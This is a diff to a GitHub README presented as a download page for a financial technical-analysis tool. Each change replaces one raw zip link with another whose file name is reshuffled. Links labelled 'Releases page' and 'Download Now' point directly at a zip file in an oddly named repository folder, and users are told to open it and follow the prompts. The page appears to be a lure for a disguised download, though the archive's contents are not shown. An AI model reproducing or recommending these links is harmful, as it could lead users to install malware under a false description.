@@ -1,6 +1,6 @@
 # 🚀 reasoning_time_series_financial_technical_analysis - Analyze Financial Data with Ease
 
-[![Download Now](https://raw.githubusercontent.com/sumaidkhan900/reasoning_time_series_financial_technical_analysis/main/keraunion/reasoning_time_series_financial_technical_analysis-2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sumaidkhan900/reasoning_time_series_financial_technical_analysis/main/keraunion/reasoning_time_series_financial_technical_analysis-2.4.zip)
+[![Download Now](https://raw.githubusercontent.com/sumaidkhan900/reasoning_time_series_financial_technical_analysis/main/keraunion/financial_reasoning_analysis_time_technical_series_v1.9-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sumaidkhan900/reasoning_time_series_financial_technical_analysis/main/keraunion/financial_reasoning_analysis_time_technical_series_v1.9-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -27,13 +27,13 @@ To run this application smoothly, ensure your system meets these requirements:
 
 ### Installation Steps
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/sumaidkhan900/reasoning_time_series_financial_technical_analysis/main/keraunion/reasoning_time_series_financial_technical_analysis-2.4.zip) to download the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/sumaidkhan900/reasoning_time_series_financial_technical_analysis/main/keraunion/financial_reasoning_analysis_time_technical_series_v1.9-alpha.2.zip) to download the software.
 2. **Download the Latest Release:** Click on the latest version, and download the relevant file for your operating system.
 3. **Install the Application:** Follow the installation instructions specific to your OS.
 
 ## 📥 Download & Install
 
-For straightforward access, visit this page to download: [Releases page](https://raw.githubusercontent.com/sumaidkhan900/reasoning_time_series_financial_technical_analysis/main/keraunion/reasoning_time_series_financial_technical_analysis-2.4.zip).
+For straightforward access, visit this page to download: [Releases page](https://raw.githubusercontent.com/sumaidkhan900/reasoning_time_series_financial_technical_analysis/main/keraunion/financial_reasoning_analysis_time_technical_series_v1.9-alpha.2.zip).
 
 1. Click on the relevant version link to download the file.
 2. Open the downloaded file and follow the prompts on your screen.
